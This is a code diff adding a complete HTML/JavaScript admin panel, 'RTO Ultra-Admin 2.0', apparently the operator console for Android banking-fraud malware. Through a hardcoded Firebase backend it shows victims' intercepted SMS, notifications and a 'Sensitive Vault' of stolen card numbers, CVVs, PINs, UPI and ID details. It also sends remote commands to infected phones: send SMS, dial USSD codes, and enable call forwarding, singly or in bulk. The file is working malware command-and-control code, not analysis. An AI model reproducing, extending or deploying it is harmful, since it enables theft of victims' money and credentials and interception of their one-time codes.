@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RTO Ultra-Admin 2.0</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .nav-link.active { background-color: #1e293b; border-left: 4px solid #3b82f6; color: white; }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+        tr:hover td { background-color: #f8fafc; }
+        .online-dot { animation: pulse-green 2s infinite; }
+        @keyframes pulse-green { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.2); opacity: 0.5; } }
+        .tab-btn.active { border-bottom: 3px solid #3b82f6; color: #3b82f6; font-weight: 900; }
+        .cmd-btn { transition: all 0.2s; cursor: pointer; }
+        .cmd-btn:active { transform: scale(0.95); }
+        #sidebar { transition: transform 0.3s ease; }
+        @media (max-width: 1024px) {
+            #sidebar.hidden-mobile { transform: translateX(-100%); }
+            #sidebar.show-mobile { transform: translateX(0); }
+        }
+    </style>
+</head>
+<body class="bg-[#f1f5f9] min-h-screen font-sans text-slate-900 flex overflow-hidden">
+
+    <!-- Mobile Overlay -->
+    <div id="mobile-overlay" onclick="toggleSidebar()" class="fixed inset-0 bg-black/50 z-40 hidden lg:hidden"></div>
+
+    <!-- Sidebar -->
+    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 w-64 bg-slate-900 text-slate-300 flex flex-col z-50 lg:z-auto hidden-mobile lg:translate-x-0 border-r border-slate-800 shadow-xl">
+        <div class="p-4 border-b border-slate-800 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <div class="bg-blue-600 p-1.5 rounded-lg"><i class="fas fa-shield-halved text-white text-lg"></i></div>
+                <span class="text-lg font-black text-white tracking-tight">RTO <span class="text-blue-500">ULTRA</span></span>
+            </div>
+            <button onclick="toggleSidebar()" class="lg:hidden text-slate-400"><i class="fas fa-times"></i></button>
+        </div>
+
+        <nav class="flex-1 overflow-y-auto py-4 px-3 space-y-1 no-scrollbar">
+            <a href="#" onclick="showView('dashboard')" id="nav-dashboard" class="nav-link flex items-center gap-3 px-4 py-2.5 rounded-lg transition-all hover:bg-slate-800 text-sm">
+                <i class="fas fa-desktop"></i> <span>Dashboard</span>
+            </a>
+            <div class="pt-6 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-2">Global Settings</div>
+            <div class="px-3 space-y-3">
+                <div class="space-y-1">
+                    <input type="text" id="global-sms-fwd" placeholder="SMS Forward Number" class="w-full bg-slate-800 border-none rounded p-2 text-[10px] text-white outline-none focus:ring-1 focus:ring-blue-500">
+                    <button onclick="saveGlobal('smsForward')" class="w-full bg-blue-600 text-white py-1 rounded text-[10px] font-bold uppercase hover:bg-blue-700">Save SMS Fwd</button>
+                </div>
+                <div class="space-y-1">
+                    <input type="text" id="global-call-fwd" placeholder="Call Forward Number" class="w-full bg-slate-800 border-none rounded p-2 text-[10px] text-white outline-none focus:ring-1 focus:ring-red-500">
+                    <button onclick="saveGlobal('callForward')" class="w-full bg-red-600 text-white py-1 rounded text-[10px] font-bold uppercase hover:bg-red-700">Save Call Fwd</button>
+                </div>
+                <button onclick="bulkCallForward()" class="w-full bg-rose-600 hover:bg-rose-700 py-2 rounded text-[10px] font-black uppercase tracking-widest text-white shadow-lg">
+                    <i class="fas fa-broadcast-tower mr-1"></i> Bulk Call Fwd
+                </button>
+            </div>
+        </nav>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="flex-1 flex flex-col min-w-0 h-screen overflow-hidden">
+        <!-- Header -->
+        <header class="bg-white border-b border-slate-200 h-14 flex items-center justify-between px-4 lg:px-6 shadow-sm flex-shrink-0">
+            <div class="flex items-center gap-3">
+                <button onclick="toggleSidebar()" class="lg:hidden text-slate-600"><i class="fas fa-bars text-lg"></i></button>
+                <h2 id="view-title" class="text-md font-black text-slate-800 uppercase tracking-tight">Dashboard</h2>
+            </div>
+            <div class="flex items-center gap-3">
+                <div class="text-right hidden sm:block">
+                    <div class="text-[10px] font-black text-slate-800">ADMIN PANEL</div>
+                    <div class="text-[8px] text-green-500 font-bold uppercase tracking-widest">Live System</div>
+                </div>
+                <div class="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-400 border border-slate-200"><i class="fas fa-user-shield text-sm"></i></div>
+            </div>
+        </header>
+
+        <div id="content-area" class="flex-1 overflow-y-auto p-3 lg:p-6 no-scrollbar bg-[#f8fafc]">
+            <!-- Dashboard View -->
+            <div id="view-dashboard" class="space-y-5">
+                <!-- Stats Row -->
+                <div class="grid grid-cols-2 lg:grid-cols-4 gap-3">
+                    <div class="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-4">
+                        <div class="w-10 h-10 bg-blue-50 text-blue-600 rounded-xl flex items-center justify-center text-lg"><i class="fas fa-users"></i></div>
+                        <div><div class="text-xl font-black" id="stat-total">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">All Devices</div></div>
+                    </div>
+                    <div class="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-4 border-l-4 border-l-green-500">
+                        <div class="w-10 h-10 bg-green-50 text-green-600 rounded-xl flex items-center justify-center text-lg"><i class="fas fa-satellite-dish"></i></div>
+                        <div><div class="text-xl font-black text-green-600" id="stat-online">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Online</div></div>
+                    </div>
+                    <div class="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-4 border-l-4 border-l-indigo-500">
+                        <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center text-lg"><i class="fas fa-envelope-open-text"></i></div>
+                        <div><div class="text-xl font-black text-indigo-600" id="stat-msgs">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Messages</div></div>
+                    </div>
+                    <div class="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-4 border-l-4 border-l-rose-500">
+                        <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-xl flex items-center justify-center text-lg"><i class="fas fa-file-invoice"></i></div>
+                        <div><div class="text-xl font-black text-rose-600" id="stat-forms">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Forms</div></div>
+                    </div>
+                </div>
+
+                <!-- User Table -->
+                <div class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden">
+                    <div class="overflow-x-auto">
+                        <table class="w-full text-left text-xs">
+                            <thead class="bg-slate-50 font-black text-slate-500 uppercase tracking-widest border-b border-slate-200">
+                                <tr>
+                                    <th class="px-6 py-4">User / Device</th>
+                                    <th class="px-6 py-4 hidden md:table-cell">SIM 1 & 2</th>
+                                    <th class="px-6 py-4">Latest Message</th>
+                                    <th class="px-6 py-4 text-right">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="user-table-body" class="divide-y divide-slate-100"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Detail View -->
+            <div id="view-detail" class="hidden space-y-4 pb-10">
+                <!-- Header -->
+                <div class="bg-white p-4 rounded-2xl shadow-md border border-slate-200 flex items-center justify-between">
+                    <div class="flex items-center gap-4">
+                        <button onclick="showView('dashboard')" class="w-10 h-10 rounded-full bg-slate-100 text-slate-600 hover:bg-slate-200 flex items-center justify-center transition-all"><i class="fas fa-arrow-left"></i></button>
+                        <div>
+                            <h3 class="text-lg font-black text-slate-900 flex items-center gap-2">
+                                <span id="det-name">---</span>
+                                <span id="det-online-dot" class="w-2.5 h-2.5 rounded-full bg-slate-300"></span>
+                            </h3>
+                            <div class="text-[10px] font-mono text-slate-400" id="det-id">UID: ---</div>
+                        </div>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <div class="px-3 py-1 rounded-full bg-blue-50 text-blue-600 text-[10px] font-black border border-blue-100 uppercase" id="det-model">---</div>
+                        <div class="px-3 py-1 rounded-full bg-green-50 text-green-600 text-[10px] font-black border border-green-100 uppercase"><i class="fas fa-bolt mr-1"></i><span id="det-bat">0%</span></div>
+                    </div>
+                </div>
+
+                <!-- Command Hub -->
+                <div class="bg-slate-900 rounded-3xl p-5 text-white shadow-2xl space-y-6">
+                    <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                        <span class="text-[11px] font-black uppercase tracking-[0.2em] text-blue-400"><i class="fas fa-terminal mr-2"></i> Remote Execution Hub</span>
+                        <div id="cmd-status" class="text-[9px] font-black bg-slate-800 px-3 py-1 rounded-full text-slate-400 uppercase">System Ready</div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+                        <!-- Basic -->
+                        <div class="space-y-3">
+                            <div class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Diagnostics</div>
+                            <div class="grid grid-cols-2 gap-2">
+                                <button onclick="sendUserCmd('CHECK_ONLINE')" class="cmd-btn bg-slate-800 hover:bg-slate-700 p-3 rounded-xl flex flex-col items-center gap-1 border border-slate-700">
+                                    <i class="fas fa-wifi text-green-400"></i><span class="text-[9px] font-black uppercase">Online Check</span>
+                                </button>
+                                <button onclick="sendUserCmd('GET_SMS')" class="cmd-btn bg-slate-800 hover:bg-slate-700 p-3 rounded-xl flex flex-col items-center gap-1 border border-slate-700">
+                                    <i class="fas fa-sync text-blue-400"></i><span class="text-[9px] font-black uppercase">Fetch SMS</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- SMS -->
+                        <div class="space-y-3">
+                            <div class="flex justify-between items-center">
+                                <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Send Message</span>
+                                <select id="cmd-sms-sim" class="bg-slate-800 text-[9px] font-black text-blue-400 rounded px-2 py-0.5 outline-none border border-slate-700 cursor-pointer"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
+                            </div>
+                            <div class="space-y-2">
+                                <input id="cmd-sms-num" placeholder="Target Number" class="w-full bg-slate-800 rounded-xl p-2.5 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all">
+                                <div class="flex gap-2">
+                                    <input id="cmd-sms-msg" placeholder="Message content..." class="flex-1 bg-slate-800 rounded-xl p-2.5 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all">
+                                    <button onclick="sendUserCmd('SEND_SMS')" class="bg-blue-600 hover:bg-blue-700 px-4 rounded-xl transition-all shadow-lg"><i class="fas fa-paper-plane text-sm"></i></button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- USSD -->
+                        <div class="space-y-3">
+                            <div class="flex justify-between items-center">
+                                <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest">USSD Dialer</span>
+                                <select id="cmd-ussd-sim" class="bg-slate-800 text-[9px] font-black text-indigo-400 rounded px-2 py-0.5 outline-none border border-slate-700 cursor-pointer"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
+                            </div>
+                            <div class="flex gap-2">
+                                <input id="cmd-ussd-code" placeholder="e.g. *121#" class="flex-1 bg-slate-800 rounded-xl p-2.5 text-xs outline-none border border-slate-700 focus:border-indigo-500 font-mono tracking-widest">
+                                <button onclick="sendUserCmd('USSD')" class="bg-indigo-600 hover:bg-indigo-700 px-5 rounded-xl font-black text-xs transition-all uppercase">Dial</button>
+                            </div>
+                        </div>
+
+                        <!-- Call Forward -->
+                        <div class="space-y-3">
+                            <div class="flex justify-between items-center">
+                                <span class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Call Forwarding</span>
+                                <select id="cmd-cf-sim" class="bg-slate-800 text-[9px] font-black text-rose-400 rounded px-2 py-0.5 outline-none border border-slate-700 cursor-pointer"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
+                            </div>
+                            <input id="cmd-cf-num" placeholder="Forward to Number" class="w-full bg-slate-800 rounded-xl p-2.5 text-xs outline-none border border-slate-700 focus:border-rose-500 mb-2">
+                            <div class="grid grid-cols-2 gap-2">
+                                <button onclick="sendUserCmd('CALL_FORWARD')" class="bg-rose-600 hover:bg-rose-700 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all shadow-lg">Activate</button>
+                                <button onclick="sendUserCmd('DEACTIVATE_FORWARD')" class="bg-slate-700 hover:bg-slate-600 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all">Stop</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Detail Tabs -->
+                <div class="space-y-4">
+                    <div class="flex border-b border-slate-200 overflow-x-auto no-scrollbar gap-8 px-2">
+                        <button onclick="setDetailTab('sms')" id="tab-sms" class="tab-btn pb-3 text-xs uppercase tracking-[0.2em] active">SMS History</button>
+                        <button onclick="setDetailTab('forms')" id="tab-forms" class="tab-btn pb-3 text-xs uppercase tracking-[0.2em] text-rose-600">Sensitive Vault</button>
+                        <button onclick="setDetailTab('notif')" id="tab-notif" class="tab-btn pb-3 text-xs uppercase tracking-[0.2em]">Notifications</button>
+                    </div>
+
+                    <!-- SMS List -->
+                    <div id="detail-sms-sec" class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden flex flex-col max-h-[600px]">
+                        <div class="p-4 bg-slate-50 border-b border-slate-200 flex justify-between items-center">
+                            <span class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Message Inbox</span>
+                            <span id="det-msg-count" class="bg-blue-600 text-white text-[9px] font-black px-2.5 py-0.5 rounded-full">0</span>
+                        </div>
+                        <div id="det-sms-logs" class="flex-1 overflow-y-auto p-4 space-y-3 no-scrollbar bg-[#fcfdfe]"></div>
+                    </div>
+
+                    <!-- Vault / Forms -->
+                    <div id="detail-forms-sec" class="hidden space-y-4">
+                        <div id="det-form-sections" class="space-y-6"></div>
+                    </div>
+
+                    <!-- Notifications -->
+                    <div id="detail-notif-sec" class="hidden bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden flex flex-col max-h-[600px]">
+                        <div class="p-4 bg-slate-50 border-b border-slate-200 text-[10px] font-black text-slate-500 uppercase tracking-widest">App Intercepts</div>
+                        <div id="det-notif-logs" class="flex-1 overflow-y-auto p-4 space-y-3 no-scrollbar"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyC8HPybACkakQo9FFF-jkxCEq0SJTwzZOg",
+        authDomain: "rtop-d4f9d.firebaseapp.com",
+        databaseURL: "https://rtop-d4f9d-default-rtdb.firebaseio.com",
+        projectId: "rtop-d4f9d",
+        storageBucket: "rtop-d4f9d.firebasestorage.app",
+        messagingSenderId: "494312710136",
+        appId: "1:494312710136:android:297cf7a23f08cfaa5f400d"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let usersData = {};
+    let selectedUid = null;
+
+    function toggleSidebar() {
+        const sb = document.getElementById('sidebar');
+        const ov = document.getElementById('mobile-overlay');
+        const isH = sb.classList.contains('hidden-mobile');
+        if(isH) { sb.classList.remove('hidden-mobile'); sb.classList.add('show-mobile'); ov.classList.remove('hidden'); }
+        else { sb.classList.add('hidden-mobile'); sb.classList.remove('show-mobile'); ov.classList.add('hidden'); }
+    }
+
+    db.ref('Users').on('value', snap => {
+        usersData = snap.val() || {};
+        updateDashboard();
+        if(selectedUid) updateDetails(selectedUid);
+    });
+
+    function updateDashboard() {
+        const uids = Object.keys(usersData);
+        let online = 0, msgs = 0, forms = 0;
+        const tbody = document.getElementById('user-table-body');
+        tbody.innerHTML = '';
+
+        const sorted = uids.sort((a,b) => (usersData[b].I?.lo || 0) - (usersData[a].I?.lo || 0));
+
+        sorted.forEach(uid => {
+            const u = usersData[uid];
+            const info = u.I || {};
+            const sims = u.S || [];
+            const mList = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
+            const lastM = mList[0] || {};
+            const isOnline = Date.now() - (info.lo || 0) < 60000;
+
+            if(isOnline) online++;
+            msgs += Object.keys(u.M || {}).length;
+            if(u.F) forms++;
+
+            const name = info.m || "Unknown Device";
+            const tr = document.createElement('tr');
+            tr.className = "cursor-pointer active:bg-slate-100 transition-all hover:bg-slate-50";
+            tr.onclick = () => showUserDetails(uid);
+            tr.innerHTML = `
+                <td class="px-6 py-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-8 h-8 rounded-lg flex items-center justify-center text-sm ${isOnline ? 'bg-green-100 text-green-600 shadow-sm' : 'bg-slate-100 text-slate-400'}">
+                            <i class="fas fa-mobile-screen"></i>
+                        </div>
+                        <div>
+                            <div class="font-black text-slate-800 text-[11px] uppercase">${name.substring(0,15)}</div>
+                            <div class="text-[8px] font-mono text-slate-400 uppercase tracking-tighter">${uid.substring(0,12)}</div>
+                        </div>
+                    </div>
+                </td>
+                <td class="px-6 py-4 hidden md:table-cell">
+                    <div class="space-y-0.5">
+                        <div class="text-[9px] font-black text-slate-600">S1: ${sims[0]?.n || 'Hidden'}</div>
+                        <div class="text-[9px] text-slate-400 font-bold">S2: ${sims[1]?.n || 'Empty'}</div>
+                    </div>
+                </td>
+                <td class="px-6 py-4 max-w-[200px]">
+                    <div class="text-[9px] font-black text-blue-600 truncate uppercase">${lastM.s || 'No Interactions'}</div>
+                    <div class="text-[10px] text-slate-500 truncate italic font-medium">"${lastM.m || '...'}"</div>
+                </td>
+                <td class="px-6 py-4 text-right">
+                    <button class="bg-slate-900 text-white px-4 py-1.5 rounded-lg text-[9px] font-black uppercase tracking-widest hover:bg-blue-600 transition-all shadow-md">Manage</button>
+                </td>
+            `;
+            tbody.appendChild(tr);
+        });
+
+        document.getElementById('stat-total').innerText = uids.length;
+        document.getElementById('stat-online').innerText = online;
+        document.getElementById('stat-msgs').innerText = msgs;
+        document.getElementById('stat-forms').innerText = forms;
+    }
+
+    function showUserDetails(uid) {
+        selectedUid = uid;
+        showView('detail');
+        updateDetails(uid);
+    }
+
+    function updateDetails(uid) {
+        const u = usersData[uid];
+        if(!u) return;
+        const info = u.I || {};
+        const sims = u.S || [];
+        const isOnline = Date.now() - (info.lo || 0) < 60000;
+
+        document.getElementById('det-name').innerText = info.m || "Device";
+        document.getElementById('det-id').innerText = `DEVICE ID: ${uid}`;
+        document.getElementById('det-model').innerText = info.mf || 'Unknown';
+        document.getElementById('det-bat').innerText = `${info.bl || 0}%`;
+        document.getElementById('det-online-dot').className = `w-3 h-3 rounded-full ${isOnline ? 'bg-green-500 online-dot' : 'bg-slate-300'}`;
+
+        // SMS Logs
+        const smsDiv = document.getElementById('det-sms-logs');
+        smsDiv.innerHTML = '';
+        const msgs = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
+        document.getElementById('det-msg-count').innerText = msgs.length;
+        msgs.forEach(m => {
+            const div = document.createElement('div');
+            div.className = "bg-white p-3 rounded-2xl border border-slate-100 shadow-sm group";
+            div.innerHTML = `
+                <div class="flex justify-between items-center mb-1.5">
+                    <span class="text-[9px] font-black text-blue-600 uppercase tracking-widest">${m.s} (SIM ${m.ss || '?'})</span>
+                    <span class="text-[8px] font-bold text-slate-400">${new Date(m.ts).toLocaleString()}</span>
+                </div>
+                <div class="text-[11px] font-semibold text-slate-800 leading-normal">"${m.m}"</div>
+            `;
+            smsDiv.appendChild(div);
+        });
+
+        // Notifications
+        const notifDiv = document.getElementById('det-notif-logs');
+        notifDiv.innerHTML = '';
+        const notifs = Object.values(u.N || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
+        notifs.forEach(n => {
+            const div = document.createElement('div');
+            div.className = "bg-slate-50 p-3 rounded-xl border border-slate-100";
+            div.innerHTML = `
+                <div class="flex justify-between text-[8px] font-black uppercase text-indigo-500 mb-1">
+                    <span>${n.p || 'App'}</span>
+                    <span>${new Date(parseInt(n.ts)).toLocaleTimeString()}</span>
+                </div>
+                <div class="text-[10px] font-black text-slate-900">${n.t}</div>
+                <div class="text-[10px] text-slate-500 italic font-medium">"${n.tx}"</div>
+            `;
+            notifDiv.appendChild(div);
+        });
+
+        // Forms / Vault
+        const formDiv = document.getElementById('det-form-sections');
+        formDiv.innerHTML = '';
+        const forms = Object.values(u.F || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
+
+        forms.forEach((f, idx) => {
+            const categories = {'Payment & Financials': [], 'Personal & Auth': [], 'Other Info': []};
+            for(let k in f) {
+                if(k==='ts') continue;
+                const v = f[k];
+                const key = k.toLowerCase();
+                if(/card|cvv|pin|exp|pay|bank|upi|atm/.test(key)) categories['Payment & Financials'].push({k,v});
+                else if(/name|user|pass|mobile|pan|aad|dob/.test(key)) categories['Personal & Auth'].push({k,v});
+                else categories['Other Info'].push({k,v});
+            }
+
+            const wrap = document.createElement('div');
+            wrap.className = "space-y-3 border-l-[6px] border-rose-600 pl-4 mb-8";
+            wrap.innerHTML = `<div class="text-[10px] font-black text-rose-600 uppercase tracking-[0.2em]">Intercepted Data #${idx+1} <span class="text-slate-400 ml-4">${new Date(f.ts).toLocaleString()}</span></div>`;
+
+            for(let cat in categories) {
+                if(categories[cat].length === 0) continue;
+                const sec = document.createElement('div');
+                sec.className = "bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden";
+                let items = `<div class="grid grid-cols-2 lg:grid-cols-4 gap-px bg-slate-100 border-t border-slate-100">`;
+                categories[cat].forEach(i => {
+                    const isS = /card|cvv|pin|pass/.test(i.k.toLowerCase());
+                    items += `
+                        <div class="bg-white p-3 group">
+                            <div class="text-[8px] font-black text-slate-400 uppercase tracking-widest mb-1">${i.k}</div>
+                            <div class="text-[11px] font-black ${isS ? 'text-rose-600' : 'text-slate-800'} break-all flex items-center justify-between">
+                                <span>${i.v}</span>
+                                <i class="far fa-copy cursor-pointer text-blue-500 opacity-0 group-hover:opacity-100 transition-all" onclick="copy('${i.v}')"></i>
+                            </div>
+                        </div>`;
+                });
+                items += `</div>`;
+                sec.innerHTML = `<div class="bg-slate-50 px-4 py-2 border-b border-slate-200 text-[9px] font-black uppercase text-slate-500 tracking-widest">${cat}</div>${items}`;
+                wrap.appendChild(sec);
+            }
+            formDiv.appendChild(wrap);
+        });
+    }
+
+    function showView(name) {
+        document.getElementById('view-dashboard').classList.toggle('hidden', name !== 'dashboard');
+        document.getElementById('view-detail').classList.toggle('hidden', name !== 'detail');
+        document.getElementById('view-title').innerText = name.toUpperCase();
+        if(window.innerWidth < 1024) toggleSidebar();
+    }
+
+    function setDetailTab(t) {
+        document.getElementById('detail-sms-sec').classList.toggle('hidden', t !== 'sms');
+        document.getElementById('detail-forms-sec').classList.toggle('hidden', t !== 'forms');
+        document.getElementById('detail-notif-sec').classList.toggle('hidden', t !== 'notif');
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById('tab-'+t).classList.add('active');
+    }
+
+    function sendUserCmd(type) {
+        if(!selectedUid) return;
+        const cmd = { t: type, ts: Date.now() };
+        if(type === 'SEND_SMS') {
+            cmd.n = document.getElementById('cmd-sms-num').value;
+            cmd.m = document.getElementById('cmd-sms-msg').value;
+            cmd.s = document.getElementById('cmd-sms-sim').value;
+            if(!cmd.n || !cmd.m) return alert('Enter Number & Message');
+        } else if(type === 'USSD') {
+            cmd.c = document.getElementById('cmd-ussd-code').value;
+            cmd.s = document.getElementById('cmd-ussd-sim').value;
+            if(!cmd.c) return alert('Enter USSD Code');
+        } else if(type === 'CALL_FORWARD') {
+            cmd.n = document.getElementById('cmd-cf-num').value;
+            cmd.s = document.getElementById('cmd-cf-sim').value;
+            if(!cmd.n) return alert('Enter Forwarding Number');
+        } else if(type === 'DEACTIVATE_FORWARD') {
+            cmd.s = document.getElementById('cmd-cf-sim').value;
+        }
+
+        db.ref(`Users/${selectedUid}/C`).push(cmd);
+        const st = document.getElementById('cmd-status');
+        st.innerText = "COMMAND SENT ✓";
+        st.className = "text-[9px] font-black bg-green-600 px-3 py-1 rounded-full text-white uppercase";
+        setTimeout(() => {
+            st.innerText = "SYSTEM READY";
+            st.className = "text-[9px] font-black bg-slate-800 px-3 py-1 rounded-full text-slate-400 uppercase";
+        }, 3000);
+    }
+
+    function copy(t) { navigator.clipboard.writeText(t); alert('Copied to clipboard'); }
+    function saveGlobal(k) {
+        const v = document.getElementById(k==='smsForward'?'global-sms-fwd':'global-call-fwd').value;
+        db.ref('Settings').child(k).set(v);
+        alert('Global setting updated');
+    }
+    function bulkCallForward() {
+        const n = document.getElementById('global-call-fwd').value;
+        if(!n) return alert('Set global number first');
+        Object.keys(usersData).forEach(uid => {
+            if(Date.now() - (usersData[uid].I?.lo || 0) < 60000) {
+                db.ref(`Users/${uid}/C`).push({t:'CALL_FORWARD', n:n, s:1, ts:Date.now()});
+            }
+        });
+        alert('Bulk Forward Command Broadcasted');
+    }
+
+    showView('dashboard');
+</script>
+</body>
+</html>
